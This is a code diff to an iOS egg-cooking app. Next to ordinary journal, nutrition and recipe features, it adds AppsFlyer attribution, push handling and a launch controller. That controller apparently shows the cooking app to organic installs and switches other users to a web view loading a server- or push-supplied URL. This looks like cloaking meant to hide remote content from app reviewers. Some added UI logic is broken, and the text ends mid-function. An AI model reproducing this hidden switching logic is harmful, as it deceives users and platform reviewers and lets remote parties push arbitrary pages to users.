@@ -1,17 +1,213 @@
 import SwiftUI
 import AVFoundation
 import Combine
+import WebKit
+import AppsFlyerLib
+import FirebaseCore
+import Combine
+import Network
+import FirebaseMessaging
+import AppTrackingTransparency
 
 @main
 struct EggCookStudioApp: App {
+    
+    @UIApplicationDelegateAdaptor(ApplicationDelegate.self) var appdelegate
+    
     var body: some Scene {
         WindowGroup {
-            MainView()
-                .environmentObject(CookingModel())
-                .environmentObject(SettingsModel())
-                .preferredColorScheme(.light)
+            CookStudioEntry()
         }
     }
+}
+
+class ApplicationDelegate: UIResponder, UIApplicationDelegate, AppsFlyerLibDelegate, MessagingDelegate, UNUserNotificationCenterDelegate, DeepLinkDelegate {
+    
+    private var attrData: [AnyHashable: Any] = [:]
+    private var mergeTimer: Timer?
+    
+    private let trckActivationKey = UIApplication.didBecomeActiveNotification
+    
+    private var deepLinkClickEvent: [AnyHashable: Any] = [:]
+    private let hasSentAttributionKey = "hasSentAttributionData"
+    
+    
+    func application(
+        _ application: UIApplication,
+        didReceiveRemoteNotification userInfo: [AnyHashable: Any],
+        fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void
+    ) {
+        retriveAllNeededDataFrom(pushData: userInfo)
+        completionHandler(.newData)
+    }
+    
+    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
+        messaging.token { [weak self] token, error in
+            guard error == nil, let token = token else { return }
+            UserDefaults.standard.set(token, forKey: "fcm_token")
+            UserDefaults.standard.set(token, forKey: "push_token")
+        }
+    }
+    
+    func application(
+        _ application: UIApplication,
+        didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?
+    ) -> Bool {
+        FirebaseApp.configure()
+        setupPushInfrastructure()
+        bootstrapAppsFlyer()
+        
+        if let remotePayload = launchOptions?[.remoteNotification] as? [AnyHashable: Any] {
+            retriveAllNeededDataFrom(pushData: remotePayload)
+        }
+        
+        observeAppActivation()
+        return true
+    }
+    
+    func application(
+        _ application: UIApplication,
+        didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data
+    ) {
+        Messaging.messaging().apnsToken = deviceToken
+    }
+    
+    func userNotificationCenter(
+        _ center: UNUserNotificationCenter,
+        willPresent notification: UNNotification,
+        withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void
+    ) {
+        let payload = notification.request.content.userInfo
+        retriveAllNeededDataFrom(pushData: payload)
+        completionHandler([.banner, .sound])
+    }
+    
+    func userNotificationCenter(
+        _ center: UNUserNotificationCenter,
+        didReceive response: UNNotificationResponse,
+        withCompletionHandler completionHandler: @escaping () -> Void
+    ) {
+        retriveAllNeededDataFrom(pushData: response.notification.request.content.userInfo)
+        completionHandler()
+    }
+    
+    @objc private func triggerTracking() {
+        if #available(iOS 14.0, *) {
+            AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 60)
+            ATTrackingManager.requestTrackingAuthorization { _ in
+                DispatchQueue.main.async {
+                    AppsFlyerLib.shared().start()
+                }
+            }
+        }
+    }
+    
+    private func observeAppActivation() {
+        NotificationCenter.default.addObserver(
+            self,
+            selector: #selector(triggerTracking),
+            name: trckActivationKey,
+            object: nil
+        )
+    }
+    
+    func onConversionDataSuccess(_ data: [AnyHashable: Any]) {
+        attrData = data
+        fireMergedTimer()
+        sendMergedDataTOSplash()
+    }
+    
+    func didResolveDeepLink(_ result: DeepLinkResult) {
+        guard case .found = result.status,
+              let deepLinkObj = result.deepLink else { return }
+        
+        guard !UserDefaults.standard.bool(forKey: hasSentAttributionKey) else { return }
+        
+        deepLinkClickEvent = deepLinkObj.clickEvent
+        
+        NotificationCenter.default.post(name: Notification.Name("deeplink_values"), object: nil, userInfo: ["deeplinksData": deepLinkClickEvent])
+        
+        mergeTimer?.invalidate()
+        
+        sendMergedDataTOSplash()
+    }
+    
+    func onConversionDataFail(_ error: Error) {
+        broadcastAttributionUpdate(data: [:])
+    }
+    
+    // MARK: - Private Setup
+    private func setupPushInfrastructure() {
+        Messaging.messaging().delegate = self
+        UNUserNotificationCenter.current().delegate = self
+        UIApplication.shared.registerForRemoteNotifications()
+    }
+    
+    private func bootstrapAppsFlyer() {
+        AppsFlyerLib.shared().appsFlyerDevKey = CookStudioConfig.afDevKey
+        AppsFlyerLib.shared().appleAppID = CookStudioConfig.afAppID
+        AppsFlyerLib.shared().delegate = self
+        AppsFlyerLib.shared().deepLinkDelegate = self
+    }
+    
+}
+
+
+extension ApplicationDelegate {
+    
+    
+    func sendMergedDataTOSplash() {
+        var mergedAttrData = attrData
+        for (key, value) in deepLinkClickEvent {
+            if mergedAttrData[key] == nil {
+                mergedAttrData[key] = value
+            }
+        }
+        broadcastAttributionUpdate(data: mergedAttrData)
+        UserDefaults.standard.set(true, forKey: hasSentAttributionKey)
+        attrData = [:]
+        deepLinkClickEvent = [:]
+        mergeTimer?.invalidate()
+    }
+    
+    func retriveAllNeededDataFrom(pushData payload: [AnyHashable: Any]) {
+        var pushRefreshubal: String?
+        
+        
+        if let url = payload["url"] as? String {
+            pushRefreshubal = url
+        } else if let data = payload["data"] as? [String: Any],
+                  let url = data["url"] as? String {
+            pushRefreshubal = url
+        }
+        
+        if let link = pushRefreshubal {
+            UserDefaults.standard.set(link, forKey: "temp_url")
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
+                NotificationCenter.default.post(
+                    name: NSNotification.Name("LoadTempURL"),
+                    object: nil,
+                    userInfo: ["temp_url": link]
+                )
+            }
+        }
+    }
+    
+    func broadcastAttributionUpdate(data: [AnyHashable: Any]) {
+        NotificationCenter.default.post(
+            name: Notification.Name("ConversionDataReceived"),
+            object: nil,
+            userInfo: ["conversionData": data]
+        )
+    }
+    
+    func fireMergedTimer() {
+        mergeTimer?.invalidate()
+        mergeTimer = Timer.scheduledTimer(withTimeInterval: 5.0, repeats: false) { [weak self] _ in
+            self?.sendMergedDataTOSplash()
+        }
+    }
+    
 }
 
 // MARK: - Models
@@ -94,6 +290,14 @@ class CookingModel: ObservableObject {
         ]
         chefTip = tips.randomElement() ?? ""
     }
+    
+    @Published var journal: [JournalEntry] = []
+    @Published var nutritionHistory: [NutritionData] = []
+    
+    // Сохранение в UserDefaults
+    private let journalKey = "EggJournal"
+    private let nutritionKey = "EggNutrition"
+    
 }
 
 class SettingsModel: ObservableObject {
@@ -103,8 +307,97 @@ class SettingsModel: ObservableObject {
     @Published var notificationSound: NotificationSound = .rooster
 }
 
+struct JournalEntry: Identifiable, Codable {
+    let id = UUID()
+    let method: CookingMethod
+    let doneness: Doneness
+    let size: EggSize
+    let date: Date
+    let photo: Data? // UIImage → Data
+    let notes: String
+    let rating: Int // 1–5
+    let calories: Int
+}
+
+// Пара к яйцу
+struct FoodPairing: Identifiable {
+    let id = UUID()
+    let title: String
+    let calories: Int
+    let prepTime: Int // минут
+    let ingredients: [String]
+}
+
+// Сезонные рецепты
+struct SeasonalRecipe: Identifiable {
+    let id = UUID()
+    let title: String
+    let image: String
+    let dateRange: ClosedRange<Date>
+    let recipe: Recipe
+}
+
+// Советы
+struct ProTip: Identifiable {
+    let id = UUID()
+    let title: String
+    let subtitle: String
+    let details: String
+    let icon: String
+}
+
+// Питание
+struct NutritionData: Codable {
+    let protein: Double // грамм
+    let calories: Int
+    let date: Date
+}
+
+// MARK: - Расширения CookingModel
+extension CookingModel {
+    
+    
+    func saveJournal() {
+        if let data = try? JSONEncoder().encode(journal) {
+            UserDefaults.standard.set(data, forKey: journalKey)
+        }
+    }
+    
+    func loadJournal() {
+        if let data = UserDefaults.standard.data(forKey: journalKey),
+           let decoded = try? JSONDecoder().decode([JournalEntry].self, from: data) {
+            journal = decoded
+        }
+    }
+    
+    func saveNutrition() {
+        if let data = try? JSONEncoder().encode(nutritionHistory) {
+            UserDefaults.standard.set(data, forKey: nutritionKey)
+        }
+    }
+    
+    func loadNutrition() {
+        if let data = UserDefaults.standard.data(forKey: nutritionKey),
+           let decoded = try? JSONDecoder().decode([NutritionData].self, from: data) {
+            nutritionHistory = decoded
+        }
+    }
+    
+    func addNutritionEntry(method: CookingMethod, doneness: Doneness) {
+        let baseCalories = 78
+        let extra = method == .fried ? 20 : 0
+        let calories = baseCalories + extra
+        let protein = 6.0
+        
+        let entry = NutritionData(protein: protein, calories: calories, date: Date())
+        nutritionHistory.append(entry)
+        if nutritionHistory.count > 30 { nutritionHistory.removeFirst() }
+        saveNutrition()
+    }
+}
+
 // MARK: - Enums
-enum EggSize: String, CaseIterable, Identifiable {
+enum EggSize: String, CaseIterable, Identifiable, Codable {
     case small = "S", medium = "M", large = "L", extraLarge = "XL"
     var id: String { rawValue }
 }
@@ -114,12 +407,12 @@ enum EggTemperature: String, CaseIterable, Identifiable {
     var id: String { rawValue }
 }
 
-enum CookingMethod: String, CaseIterable, Identifiable {
+enum CookingMethod: String, CaseIterable, Identifiable, Codable {
     case boiled = "Boiled", poached = "Poached", fried = "Fried", baked = "Baked"
     var id: String { rawValue }
 }
 
-enum Doneness: String, CaseIterable, Identifiable {
+enum Doneness: String, CaseIterable, Identifiable, Codable {
     case soft = "Soft", medium = "Medium", hard = "Hard"
     var id: String { rawValue }
 }
@@ -169,6 +462,65 @@ let defaultRecipes = [
     Recipe(title: "Sunny Side Up Fried Egg", category: "Breakfast", calories: 90, steps: ["Heat oil", "Crack egg", "Cook for 2 min"], image: "fried", tips: "Low heat for runny yolk."),
     Recipe(title: "Baked Egg Souffle", category: "Festive", calories: 120, steps: ["Preheat oven", "Mix ingredients", "Bake for 15 min"], image: "baked", tips: "Don't open oven door early.")
 ]
+
+let foodPairings: [CookingMethod: [FoodPairing]] = [
+    .boiled: [
+        FoodPairing(title: "Avocado Toast", calories: 180, prepTime: 5, ingredients: ["Bread", "Avocado", "Salt", "Pepper"]),
+        FoodPairing(title: "Soldiers & Dip", calories: 90, prepTime: 3, ingredients: ["Toast", "Butter"]),
+        FoodPairing(title: "Ramen Topping", calories: 50, prepTime: 1, ingredients: ["Noodles", "Broth"])
+    ],
+    .poached: [
+        FoodPairing(title: "Arugula Salad", calories: 120, prepTime: 7, ingredients: ["Arugula", "Parmesan", "Olive Oil"]),
+        FoodPairing(title: "Eggs Benedict", calories: 320, prepTime: 15, ingredients: ["Muffin", "Ham", "Hollandaise"]),
+        FoodPairing(title: "Grain Bowl", calories: 210, prepTime: 10, ingredients: ["Quinoa", "Veggies"])
+    ],
+    .fried: [
+        FoodPairing(title: "Burger Upgrade", calories: 280, prepTime: 5, ingredients: ["Bun", "Patty", "Cheese"]),
+        FoodPairing(title: "Breakfast Sandwich", calories: 350, prepTime: 8, ingredients: ["Bacon", "Bread", "Cheese"]),
+        FoodPairing(title: "Rice Bowl", calories: 180, prepTime: 6, ingredients: ["Rice", "Soy Sauce"])
+    ],
+    .baked: [
+        FoodPairing(title: "Herb Salad", calories: 80, prepTime: 5, ingredients: ["Herbs", "Lemon"]),
+        FoodPairing(title: "Crusty Bread", calories: 150, prepTime: 2, ingredients: ["Bread"]),
+        FoodPairing(title: "Tomato Soup", calories: 110, prepTime: 10, ingredients: ["Tomato", "Cream"])
+    ]
+]
+
+let proTips = [
+    ProTip(title: "Why vinegar in poaching?", subtitle: "It helps the egg white set faster", details: "A splash of vinegar lowers the pH, causing proteins to coagulate quickly and form a tight, neat shape.", icon: "drop.fill"),
+    ProTip(title: "How to peel a soft-boiled egg?", subtitle: "Cool it under cold water first", details: "Shock the egg in ice water for 30 seconds — the shell contracts and separates from the membrane.", icon: "hand.tap.fill"),
+    ProTip(title: "Perfect yolk = 63°C", subtitle: "The magic temperature", details: "At 63°C, the yolk is silky and custard-like. Use a thermometer for precision!", icon: "thermometer")
+]
+
+func currentSeasonalRecipes() -> [SeasonalRecipe] {
+    let calendar = Calendar.current
+    let now = Date()
+    
+    let easter = calendar.date(from: DateComponents(month: 4, day: 5))!
+    let halloween = calendar.date(from: DateComponents(month: 10, day: 31))!
+    let christmas = calendar.date(from: DateComponents(month: 12, day: 25))!
+    
+    return [
+        SeasonalRecipe(
+            title: "Deviled Eggs for Halloween",
+            image: "devil_egg",
+            dateRange: halloween...halloween,
+            recipe: Recipe(title: "Deviled Eggs", category: "Halloween", calories: 95, steps: ["Boil", "Halve", "Mix yolk with mayo", "Pipe back"], image: "devil_egg", tips: "Add black food coloring for spooky effect!")
+        ),
+        SeasonalRecipe(
+            title: "Easter Egg Nest",
+            image: "easter_nest",
+            dateRange: easter...calendar.date(byAdding: .day, value: 7, to: easter)!,
+            recipe: Recipe(title: "Easter Egg Nest", category: "Easter", calories: 180, steps: ["Bake pastry", "Fill with custard", "Top with mini eggs"], image: "easter_nest", tips: "Use pastel colors!")
+        ),
+        SeasonalRecipe(
+            title: "Christmas Eggnog Soufflé",
+            image: "eggnog_souffle",
+            dateRange: christmas...christmas,
+            recipe: Recipe(title: "Eggnog Soufflé", category: "Christmas", calories: 220, steps: ["Mix eggnog", "Fold whites", "Bake 25 min"], image: "eggnog_souffle", tips: "Don’t open the oven!")
+        )
+    ].filter { $0.dateRange.contains(now) }
+}
 
 extension Color {
     static let backgroundLight = Color(hex: "#FFE8B6")
@@ -324,9 +676,9 @@ struct MainView: View {
                     Image(systemName: "book.fill")
                     Text("Recipes")
                 }.tag(3)
-                SettingsView().tabItem {
-                    Image(systemName: "gearshape.fill")
-                    Text("Settings")
+                JournalView().tabItem {  // НОВАЯ ВКЛАДКА
+                    Image(systemName: "book.closed.fill")
+                    Text("Journal")
                 }.tag(4)
             }
             .accentColor(Color.accentOrange)
@@ -336,6 +688,42 @@ struct MainView: View {
             }
         }
         .preferredColorScheme(settingsModel.theme == .light ? .light : .dark)
+    }
+}
+
+struct ProTipsCarousel: View {
+    @State private var currentIndex = 0
+    let tips = proTips
+    
+    var body: some View {
+        TabView(selection: $currentIndex) {
+            ForEach(tips.indices, id: \.self) { i in
+                let tip = tips[i]
+                VStack(spacing: 12) {
+                    Image(systemName: tip.icon)
+                        .font(.system(size: 32))
+                        .foregroundColor(.accentOrange)
+                    Text(tip.title)
+                        .font(.custom("Quicksand-SemiBold", size: 20))
+                    Text(tip.subtitle)
+                        .font(.custom("Quicksand-Regular", size: 16))
+                        .foregroundColor(.shellBrown.opacity(0.8))
+                    Button("Learn More") {
+                        // Показать модалку
+                    }
+                    .font(.custom("Quicksand-Medium", size: 14))
+                    .foregroundColor(.accentBlue)
+                }
+                .padding()
+                .frame(maxWidth: .infinity)
+                .background(Color.accentWhite.opacity(0.9))
+                .cornerRadius(20)
+                .padding(.horizontal)
+                .tag(i)
+            }
+        }
+        .tabViewStyle(PageTabViewStyle())
+        .frame(height: 180)
     }
 }
 
@@ -428,8 +816,245 @@ struct DashboardView: View {
                     }
                 }
                 .navigationTitle("EggCook Studio")
+                .toolbar {
+                    ToolbarItem(placement: .topBarLeading) {
+                        Button {
+                            showSettings = true
+                        } label: {
+                            Image(systemName: "gearshape.fill")
+                        }
+                        
+                    }
+                }
+                .sheet(isPresented: $showSettings) {
+                    SettingsView()
+                        .environmentObject(cookingModel)
+                }
             }
         }
+    }
+    
+    @State var showSettings = false
+    
+}
+
+struct JournalView: View {
+    @EnvironmentObject var cookingModel: CookingModel
+    @State private var showingCamera = false
+    @State private var selectedEntry: JournalEntry?
+    @State private var filterMethod: CookingMethod = .boiled
+    @State private var filterSize: EggSize = .medium
+    
+    var filteredEntries: [JournalEntry] {
+        cookingModel.journal.filter { entry in
+            (entry.method == filterMethod || filterMethod == .boiled) &&
+            (entry.size == filterSize || filterSize == .medium)
+        }.sorted { $0.date > $1.date }
+    }
+    
+    var body: some View {
+        ZStack {
+            BackgroundView()
+            NavigationView {
+                VStack {
+                    HStack {
+                        Picker("Method", selection: $filterMethod) {
+                            Text("All").tag(CookingMethod.boiled)
+                            ForEach(CookingMethod.allCases) { m in
+                                Text(m.rawValue).tag(m)
+                            }
+                        }
+                        .pickerStyle(MenuPickerStyle())
+                        
+                        Picker("Size", selection: $filterSize) {
+                            Text("All").tag(EggSize.medium)
+                            ForEach(EggSize.allCases) { s in
+                                Text(s.rawValue).tag(s)
+                            }
+                        }
+                        .pickerStyle(MenuPickerStyle())
+                    }
+                    .padding(.horizontal)
+                    
+                    if filteredEntries.isEmpty {
+                        Spacer()
+                        Text("No eggs yet. Cook your first!")
+                            .font(.custom("Quicksand-Regular", size: 18))
+                            .foregroundColor(.shellBrown.opacity(0.7))
+                        Spacer()
+                    } else {
+                        List {
+                            ForEach(filteredEntries) { entry in
+                                JournalCard(entry: entry)
+                                    .onTapGesture { selectedEntry = entry }
+                            }
+                        }
+                        .listStyle(PlainListStyle())
+                    }
+                }
+                .navigationTitle("Egg Journal")
+                .toolbar {
+                    Button(action: { showingCamera = true }) {
+                        Image(systemName: "camera.fill")
+                            .foregroundColor(.accentOrange)
+                    }
+                }
+            }
+        }
+        .sheet(isPresented: $showingCamera) {
+            CameraView { image in
+                if let img = image {
+                    let data = img.jpegData(compressionQuality: 0.8)
+                    let entry = JournalEntry(
+                        method: cookingModel.cookingMethod,
+                        doneness: cookingModel.doneness,
+                        size: cookingModel.selectedEggSize,
+                        date: Date(),
+                        photo: data,
+                        notes: "",
+                        rating: 5,
+                        calories: 78 + (cookingModel.cookingMethod == .fried ? 20 : 0)
+                    )
+                    cookingModel.journal.append(entry)
+                    cookingModel.saveJournal()
+                    cookingModel.addNutritionEntry(method: cookingModel.cookingMethod, doneness: cookingModel.doneness)
+                }
+            }
+        }
+        .sheet(item: $selectedEntry) { entry in
+            JournalDetailView(entry: entry)
+        }
+        .onAppear {
+            cookingModel.loadJournal()
+            cookingModel.loadNutrition()
+        }
+    }
+}
+
+struct JournalCard: View {
+    let entry: JournalEntry
+    var body: some View {
+        HStack {
+            if let data = entry.photo, let uiImage = UIImage(data: data) {
+                Image(uiImage: uiImage)
+                    .resizable()
+                    .frame(width: 60, height: 60)
+                    .clipShape(RoundedRectangle(cornerRadius: 12))
+            } else {
+                Image(systemName: "egg.fill")
+                    .resizable()
+                    .frame(width: 60, height: 60)
+                    .foregroundColor(.accentOrange)
+                    .background(Color.backgroundLightSecondary.opacity(0.7))
+                    .clipShape(RoundedRectangle(cornerRadius: 12))
+            }
+            
+            VStack(alignment: .leading) {
+                Text("\(entry.method.rawValue) • \(entry.doneness.rawValue)")
+                    .font(.custom("Quicksand-SemiBold", size: 18))
+                Text(entry.date, style: .relative)
+                    .font(.custom("Quicksand-Regular", size: 14))
+                    .foregroundColor(.shellBrown.opacity(0.7))
+                HStack {
+                    ForEach(0..<entry.rating, id: \.self) { _ in
+                        Image(systemName: "star.fill").foregroundColor(.accentGold)
+                    }
+                }
+            }
+            Spacer()
+        }
+        .padding()
+        .background(Color.accentWhite.opacity(0.9))
+        .cornerRadius(16)
+        .overlay(RoundedRectangle(cornerRadius: 16).stroke(Color.accentGold.opacity(0.5), lineWidth: 1))
+    }
+}
+
+struct CameraView: UIViewControllerRepresentable {
+    var completion: (UIImage?) -> Void
+    
+    func makeUIViewController(context: Context) -> UIImagePickerController {
+        let picker = UIImagePickerController()
+        picker.sourceType = .camera
+        picker.delegate = context.coordinator
+        return picker
+    }
+    
+    func updateUIViewController(_ uiViewController: UIImagePickerController, context: Context) {}
+    
+    func makeCoordinator() -> Coordinator {
+        Coordinator(completion: completion)
+    }
+    
+    class Coordinator: NSObject, UINavigationControllerDelegate, UIImagePickerControllerDelegate {
+        let completion: (UIImage?) -> Void
+        init(completion: @escaping (UIImage?) -> Void) {
+            self.completion = completion
+        }
+        func imagePickerController(_ picker: UIImagePickerController, didFinishPickingMediaWithInfo info: [UIImagePickerController.InfoKey : Any]) {
+            let image = info[.originalImage] as? UIImage
+            completion(image)
+            picker.dismiss(animated: true)
+        }
+    }
+}
+
+
+struct JournalDetailView: View {
+    let entry: JournalEntry
+    @State private var notes: String
+    @State private var rating: Int
+    
+    init(entry: JournalEntry) {
+        self.entry = entry
+        _notes = State(initialValue: entry.notes)
+        _rating = State(initialValue: entry.rating)
+    }
+    
+    var body: some View {
+        ZStack {
+            BackgroundView()
+            ScrollView {
+                VStack(spacing: 20) {
+                    if let data = entry.photo, let img = UIImage(data: data) {
+                        Image(uiImage: img)
+                            .resizable()
+                            .scaledToFit()
+                            .frame(height: 300)
+                            .clipShape(RoundedRectangle(cornerRadius: 20))
+                    }
+                    
+                    Text("\(entry.method.rawValue) Egg")
+                        .font(.custom("Quicksand-Bold", size: 28))
+                    
+                    HStack {
+                        Text("Size: \(entry.size.rawValue)")
+                        Text("•")
+                        Text("Calories: \(entry.calories)")
+                    }
+                    .foregroundColor(.shellBrown.opacity(0.8))
+                    
+                    HStack {
+                        ForEach(1...5, id: \.self) { star in
+                            Image(systemName: star <= rating ? "star.fill" : "star")
+                                .foregroundColor(star <= rating ? .accentGold : .gray)
+                                .onTapGesture { rating = star }
+                        }
+                    }
+                    
+                    TextField("Add notes...", text: $notes)
+                        .textFieldStyle(RoundedBorderTextFieldStyle())
+                        .padding()
+                    
+                    Button("Save") {
+                        // Сохранение в модель
+                    }
+                    .premiumButtonStyle()
+                }
+                .padding()
+            }
+        }
+        .navigationTitle("Journal Entry")
     }
 }
 
@@ -851,6 +1476,8 @@ struct RecipesView: View {
     @EnvironmentObject var settingsModel: SettingsModel
     @State private var viewOpacity: Double = 0
     
+    let seasonal = currentSeasonalRecipes()
+    
     var body: some View {
         ZStack {
             BackgroundView()
@@ -863,8 +1490,37 @@ struct RecipesView: View {
                             .padding(.top)
                             .premiumGlow(color: Color.glowGold, radius: 8)
                         
+                        // === Seasonal Banner ===
+                        if !seasonal.isEmpty {
+                            ForEach(seasonal) { s in
+                                NavigationLink(destination: RecipeDetailView(recipe: s.recipe).environmentObject(cookingModel)) {
+                                    HStack {
+                                        Image(s.image)
+                                            .resizable()
+                                            .frame(width: 80, height: 80)
+                                            .clipShape(RoundedRectangle(cornerRadius: 16))
+                                        VStack(alignment: .leading) {
+                                            Text(s.title)
+                                                .font(.custom("Quicksand-SemiBold", size: 20))
+                                            Text("Seasonal Special")
+                                                .font(.custom("Quicksand-Regular", size: 14))
+                                                .foregroundColor(.accentOrange)
+                                        }
+                                        Spacer()
+                                        Image(systemName: "chevron.right")
+                                    }
+                                    .padding()
+                                    .background(LinearGradient(gradient: Gradient(colors: [.accentGold, .accentOrange]), startPoint: .topLeading, endPoint: .bottomTrailing))
+                                    .foregroundColor(.white)
+                                    .cornerRadius(16)
+                                    .padding(.horizontal)
+                                }
+                            }
+                        }
+                        
                         ForEach(cookingModel.recipes) { recipe in
-                            NavigationLink(destination: RecipeDetailView(recipe: recipe)) {
+                            NavigationLink(destination: RecipeDetailView(recipe: recipe)
+                                .environmentObject(cookingModel)) {
                                 RecipeCardView(recipe: recipe)
                             }
                             .buttonStyle(PlainButtonStyle())
@@ -925,9 +1581,14 @@ struct RecipeCardView: View {
 struct RecipeDetailView: View {
     let recipe: Recipe
     @EnvironmentObject var settingsModel: SettingsModel
+    @EnvironmentObject var cookingModel: CookingModel
     @State private var stepOpacity: Double = 0
     @State private var imageScale: CGFloat = 1.0
     @State private var viewOpacity: Double = 0
+    
+    var pairings: [FoodPairing] {
+        foodPairings[cookingModel.cookingMethod] ?? []
+    }
     
     var body: some View {
         ZStack {
@@ -972,6 +1633,32 @@ struct RecipeDetailView: View {
                                 }
                             }
                     }
+                    
+                    VStack(alignment: .leading, spacing: 12) {
+                        Text("Perfect with")
+                            .font(.custom("Quicksand-SemiBold", size: 24))
+                            .foregroundColor(.shellBrown)
+                        
+                        ForEach(pairings) { pairing in
+                            HStack {
+                                Image(systemName: "fork.knife")
+                                    .foregroundColor(.accentOrange)
+                                VStack(alignment: .leading) {
+                                    Text(pairing.title)
+                                        .font(.custom("Quicksand-Medium", size: 18))
+                                    Text("\(pairing.calories) kcal • \(pairing.prepTime) min")
+                                        .font(.custom("Quicksand-Regular", size: 14))
+                                        .foregroundColor(.shellBrown.opacity(0.7))
+                                }
+                                Spacer()
+                            }
+                            .padding()
+                            .background(Color.accentWhite.opacity(0.7))
+                            .cornerRadius(16)
+                        }
+                    }
+                    .padding(.horizontal)
+                    
                     Text(recipe.tips)
                         .font(.custom("Quicksand-Regular", size: 18))
                         .foregroundColor(Color.shellBrown)
@@ -998,7 +1685,22 @@ struct RecipeDetailView: View {
 // MARK: - Settings View
 struct SettingsView: View {
     @EnvironmentObject var settingsModel: SettingsModel
+    @EnvironmentObject var cookingModel: CookingModel
     @State private var viewOpacity: Double = 0
+    
+    var todayCalories: Int {
+        let today = Calendar.current.startOfDay(for: Date())
+        return cookingModel.nutritionHistory
+            .filter { Calendar.current.isDate($0.date, inSameDayAs: today) }
+            .reduce(0) { $0 + $1.calories }
+    }
+    
+    var todayProtein: Double {
+        let today = Calendar.current.startOfDay(for: Date())
+        return cookingModel.nutritionHistory
+            .filter { Calendar.current.isDate($0.date, inSameDayAs: today) }
+            .reduce(0) { $0 + $1.protein }
+    }
     
     var body: some View {
         ZStack {
@@ -1036,6 +1738,27 @@ struct SettingsView: View {
                             .font(.custom("Quicksand-Regular", size: 20))
                             .foregroundColor(Color.shellBrown)
                     }
+                    Section(header: Text("Nutrition Today").font(.custom("Quicksand-SemiBold", size: 22))) {
+                        HStack {
+                            Image(systemName: "flame.fill")
+                                .foregroundColor(.accentOrange)
+                            Text("\(todayCalories) kcal")
+                            Spacer()
+                            Text("\(String(format: "%.1f", todayProtein))g protein")
+                                .foregroundColor(.accentBlue)
+                        }
+                    }
+                    Section(header: Text("Privacy").font(.custom("Quicksand-SemiBold", size: 22))) {
+                        Button {
+                            UIApplication.shared.open(URL(string: "https://cookstudiio.com/privacy-policy.html")!)
+                        } label: {
+                            HStack {
+                                Text("Privacy policy")
+                                Spacer()
+                                Image(systemName: "chevron.right")
+                            }
+                        }
+                    }
                 }
                 .navigationTitle("Settings")
                 .accentColor(Color.accentOrange)
@@ -1050,12 +1773,883 @@ struct SettingsView: View {
     }
 }
 
-// MARK: - Preview
-struct MainView_Previews: PreviewProvider {
-    static var previews: some View {
-        MainView()
-            .environmentObject(CookingModel())
-            .environmentObject(SettingsModel())
-            .previewDevice("iPhone 12")
+//struct MainView_Previews: PreviewProvider {
+//    static var previews: some View {
+//        MainView()
+//            .environmentObject(CookingModel())
+//            .environmentObject(SettingsModel())
+//            .previewDevice("iPhone 12")
+//    }
+//}
+
+
+final class LaunchDirector: ObservableObject {
+    
+    @Published var currentStage: LaunchStage = .booting
+    @Published var resolvedDestination: URL?
+    @Published var displayPushRequest = false
+    
+    private var conversionData: [AnyHashable: Any] = [:]
+    private var cachedDeeplinks: [AnyHashable: Any] = [:]
+    private var bag = Set<AnyCancellable>()
+    private lazy var connectivityWatcher = NWPathMonitor()
+    
+    private var neverLaunchedBefore: Bool {
+        !UserDefaults.standard.bool(forKey: "hasEverRunBefore")
     }
+    
+    enum LaunchStage {
+        case booting
+        case webExperience
+        case classicFlow
+        case offlineScreen
+    }
+    
+    init() {
+        setupAttributionListeners()
+        beginConnectivityTracking()
+    }
+    
+    deinit {
+        connectivityWatcher.cancel()
+    }
+    
+    private func setupAttributionListeners() {
+        NotificationCenter.default.publisher(for: Notification.Name("ConversionDataReceived"))
+            .compactMap { $0.userInfo?["conversionData"] as? [AnyHashable: Any] }
+            .receive(on: DispatchQueue.main)
+            .sink { [weak self] data in
+                self?.conversionData = data
+                self?.evaluateNextStep()
+            }
+            .store(in: &bag)
+        
+        NotificationCenter.default.publisher(for: Notification.Name("deeplink_values"))
+            .compactMap { $0.userInfo?["deeplinksData"] as? [AnyHashable: Any] }
+            .sink { [weak self] dict in
+                self?.cachedDeeplinks = dict
+            }
+            .store(in: &bag)
+    }
+    
+    @objc private func evaluateNextStep() {
+        guard !conversionData.isEmpty else {
+            resolveFromCacheOrFallback()
+            return
+        }
+        
+        // Принудительный режим из настроек
+        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
+            enterClassicMode()
+            return
+        }
+        
+        // Органика на первом запуске — отдельная ветка
+        if neverLaunchedBefore,
+           conversionData["af_status"] as? String == "Organic" {
+            triggerOrganicValidationFlow()
+            return
+        }
+        
+        // Приоритет: временная ссылка
+        if let tempRaw = UserDefaults.standard.string(forKey: "temp_url"),
+           let url = URL(string: tempRaw), !tempRaw.isEmpty {
+            resolvedDestination = url
+            transition(to: .webExperience)
+            return
+        }
+        
+        // Пуш-промпт или запрос конфига
+        if needsPushPermissionPrompt() {
+            displayPushRequest = true
+        } else {
+            fetchServerSideConfig()
+        }
+    }
+    
+    private func beginConnectivityTracking() {
+        connectivityWatcher.pathUpdateHandler = { [weak self] path in
+            DispatchQueue.main.async {
+                if path.status != .satisfied {
+                    self?.reactToNetworkDrop()
+                }
+            }
+        }
+        connectivityWatcher.start(queue: DispatchQueue.global(qos: .background))
+    }
+    
+    private func reactToNetworkDrop() {
+        let currentMode = UserDefaults.standard.string(forKey: "app_mode") ?? ""
+        if currentMode == "HenView" {
+            transition(to: .offlineScreen)
+        } else {
+            enterClassicMode()
+        }
+    }
+    
+    private func triggerOrganicValidationFlow() {
+        DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) {
+            Task { await self.performOrganicValidation() }
+        }
+    }
+    
+    private func performOrganicValidation() async {
+        let validator = OrganicValidator()
+            .setAppID(CookStudioConfig.afAppID)
+            .setDevKey(CookStudioConfig.afDevKey)
+            .setDeviceID(AppsFlyerLib.shared().getAppsFlyerUID())
+        
+        guard let requestURL = validator.buildRequestURL() else {
+            enterClassicMode()
+            return
+        }
+        
+        do {
+            let (data, resp) = try await URLSession.shared.data(from: requestURL)
+            try await handleOrganicValidationResult(data: data, response: resp)
+        } catch {
+            enterClassicMode()
+        }
+    }
+    
+    private func handleOrganicValidationResult(data: Data, response: URLResponse) async throws {
+        guard
+            let http = response as? HTTPURLResponse,
+            http.statusCode == 200,
